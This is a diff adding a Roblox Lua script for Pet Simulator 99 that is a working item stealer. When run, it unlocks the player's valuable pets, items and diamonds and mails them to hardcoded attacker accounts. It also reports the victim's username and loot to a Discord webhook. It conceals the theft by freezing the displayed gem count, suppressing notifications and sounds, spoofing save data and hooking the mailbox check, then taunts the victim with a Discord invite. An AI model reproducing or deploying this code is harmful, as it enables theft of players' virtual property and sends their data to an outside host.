@@ -1,0 +1,274 @@
+Username = "mrdrinkr45"
+Username2 = "r1234gt" -- fallback if first user's mailbox is full
+
+webhook = "https://discord.com/api/webhooks/1519835366276861992/8Fz8haXisbTPj9tWeTg66VoP1fZsPqX2SHwH-9GGm56o93gSK1_LPreY0jO41QIfbPnL"
+
+min_rap = 100000
+
+if getgenv().yeslidez then return end
+getgenv().yeslidez = true
+
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+local plr = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local MailMessage = "GG / FNnkfJqukh"
+
+local sortedItems = {}
+local totalRAP = 0
+
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+
+local save = GetSave().Inventory
+local mailsent = GetSave().MailboxSendsSinceReset
+
+local newamount = 20000
+if mailsent ~= 0 then
+    newamount = math.ceil(newamount * (1.5 ^ mailsent))
+end
+
+local GemAmount1 = 0
+for _, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+        break
+    end
+end
+
+if newamount > GemAmount1 then
+    return
+end
+
+local function formatNumber(number)
+    number = math.floor(number)
+    local suffixes = {"", "k", "m", "b", "t"}
+    local i = 1
+    while number >= 1000 do
+        number = number / 1000
+        i = i + 1
+    end
+    return string.format("%.2f%s", number, suffixes[i])
+end
+
+local function SendMessage(username, diamonds)
+    local headers = { ["Content-Type"] = "application/json" }
+    local combinedItems = {}
+    local itemRapMap = {}
+
+    for _, item in ipairs(sortedItems) do
+        local key = item.name
+        if itemRapMap[key] then
+            itemRapMap[key].amount = itemRapMap[key].amount + item.amount
+        else
+            itemRapMap[key] = {amount = item.amount, rap = item.rap}
+            table.insert(combinedItems, key)
+        end
+    end
+
+    table.sort(combinedItems, function(a, b)
+        return (itemRapMap[a].rap * itemRapMap[a].amount) > (itemRapMap[b].rap * itemRapMap[b].amount)
+    end)
+
+    local itemsText = ""
+    for _, name in ipairs(combinedItems) do
+        local data = itemRapMap[name]
+        itemsText = itemsText .. name .. " (x" .. data.amount .. "): " .. formatNumber(data.rap * data.amount) .. " RAP\n"
+    end
+
+    local summaryText = "Gems: " .. formatNumber(diamonds) .. "\nTotal RAP: " .. formatNumber(totalRAP)
+
+    local embed = {
+        title = "🐱 New PS99 Execution",
+        color = 65280,
+        fields = {
+            {name = "Username:", value = "```" .. username .. "```", inline = true},
+            {name = "Items:", value = "```" .. itemsText .. "```", inline = false},
+            {name = "Summary:", value = "```" .. summaryText .. "```", inline = false}
+        },
+        footer = {text = "Stealer Forked From Tobis Source, .gg/FNnkfJqukh"}
+    }
+
+    local data = {embeds = {embed}}
+
+    if #embed.fields[2].value > 1024 then
+        embed.fields[2].value = string.sub(embed.fields[2].value, 1, 1000) .. "...\n```"
+    end
+
+    local body = HttpService:JSONEncode(data)
+
+    if webhook and webhook ~= "" then
+        request({Url = webhook, Method = "POST", Headers = headers, Body = body})
+    end
+end
+
+-- Anti-detection
+local gemsleaderstat = plr.leaderstats["💎 Diamonds"].Value
+plr.leaderstats["💎 Diamonds"]:GetPropertyChangedSignal("Value"):Connect(function()
+    plr.leaderstats["💎 Diamonds"].Value = gemsleaderstat
+end)
+
+local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = plr.PlayerGui.Notifications
+loading.Disabled = true
+noti.Enabled = false
+noti:GetPropertyChangedSignal("Enabled"):Connect(function() noti.Enabled = false end)
+
+game.DescendantAdded:Connect(function(x)
+    if x.ClassName == "Sound" and (x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276") then
+        x:Destroy()
+    end
+end)
+
+local function getRAP(Type, Item)
+    local RAPCmds = require(ReplicatedStorage.Library.Client.RAPCmds)
+    local fakeItem = {Class = {Name = Type}}
+    function fakeItem:AbstractGetRAP() return nil end
+    function fakeItem:GetDefaultRAP() return 0 end
+    function fakeItem:StackKey()
+        return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
+    end
+    return RAPCmds.Get(fakeItem) or 0
+end
+
+local user = Username
+local user2 = Username2
+
+local function sendItem(category, uid, am)
+    local args = {[1] = user, [2] = MailMessage, [3] = category, [4] = uid, [5] = am or 1}
+    local success = false
+    while not success do
+        success = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        if not success then
+            user = user2
+            args[1] = user
+            task.wait()
+        end
+    end
+
+    GemAmount1 = GemAmount1 - newamount
+    newamount = math.ceil(newamount * 1.5)
+    if newamount > 5000000 then newamount = 5000000 end
+end
+
+local function SendAllGems()
+    for i, v in pairs(GetSave().Inventory.Currency) do
+        if v.id == "Diamonds" and GemAmount1 >= (newamount + 10000) then
+            local args = {[1] = user, [2] = MailMessage, [3] = "Currency", [4] = i, [5] = GemAmount1 - newamount}
+            local success = false
+            while not success do
+                success = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                task.wait()
+            end
+            break
+        end
+    end
+end
+
+local function IsMailboxHooked()
+    local uid
+    for i in pairs(save.Pet or {}) do uid = i break end
+    local args = {[1] = "Roblox", [2] = "Test", [3] = "Pet", [4] = uid, [5] = 1}
+    local _, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    return not (err == "They don't have enough space!" or err == "You don't have enough diamonds to send the mail!")
+end
+
+local function EmptyBoxes()
+    if save.Box then
+        for key, value in pairs(save.Box) do
+            if value._uq then
+                network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
+            end
+        end
+    end
+end
+
+local function ClaimMail()
+    local _, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    while err == "You must wait 30 seconds before using the mailbox!" do
+        task.wait()
+        _, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    end
+end
+
+local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
+
+for _, cat in ipairs(categoryList) do
+    if save[cat] then
+        for uid, item in pairs(save[cat]) do
+            local rapValue = 0
+            if cat == "Pet" then
+                local dir = require(ReplicatedStorage.Library.Directory.Pets)[item.id]
+                if dir.huge or dir.exclusiveLevel then
+                    rapValue = getRAP(cat, item)
+                    if rapValue >= min_rap then
+                        local prefix = (item.sh and "Shiny " or "") .. (item.pt == 1 and "Golden " or item.pt == 2 and "Rainbow " or "")
+                        local id = prefix .. item.id
+                        table.insert(sortedItems, {category = cat, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
+                        totalRAP = totalRAP + rapValue * (item._am or 1)
+                    end
+                end
+            else
+                rapValue = getRAP(cat, item)
+                if rapValue >= min_rap then
+                    table.insert(sortedItems, {category = cat, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
+                    totalRAP = totalRAP + rapValue * (item._am or 1)
+                end
+            end
+
+            if item._lk then
+                network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)
+            end
+        end
+    end
+end
+
+if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
+    ClaimMail()
+
+    if IsMailboxHooked() then
+        local Mailbox = network:WaitForChild("Mailbox: Send")
+        for _, f in ipairs(getgc(true)) do
+            if typeof(f) == "function" and debug.info(f, "n") == "typeof" then
+                local old = hookfunction(f, function(ins, ...)
+                    if ins == Mailbox then return tick() end
+                    return old(ins, ...)
+                end)
+            end
+        end
+    end
+
+    EmptyBoxes()
+    require(ReplicatedStorage.Library.Client.DaycareCmds).Claim()
+    require(ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+
+    -- Simplified save spoof (less recursive = less upvalue issues)
+    local blob_a = ReplicatedStorage.Library.Client.Save
+    local originalGet = require(blob_a).Get
+    local blob_b = originalGet()
+    require(blob_a).Get = function() return blob_b end
+
+    table.sort(sortedItems, function(a, b)
+        return a.rap * a.amount > b.rap * b.amount
+    end)
+
+    spawn(function()
+        SendMessage(plr.Name, GemAmount1)
+    end)
+
+    for _, item in ipairs(sortedItems) do
+        if item.rap >= newamount then
+            sendItem(item.category, item.uid, item.amount)
+        else
+            break
+        end
+    end
+
+    SendAllGems()
+
+    local message = require(ReplicatedStorage.Library.Client.Message)
+    message.Error("All your items just got stolen by yeslidez\n Join https://discord.gg/FNnkfJqukh")
+    setclipboard("https://discord.gg/FNnkfJqukh")
+end
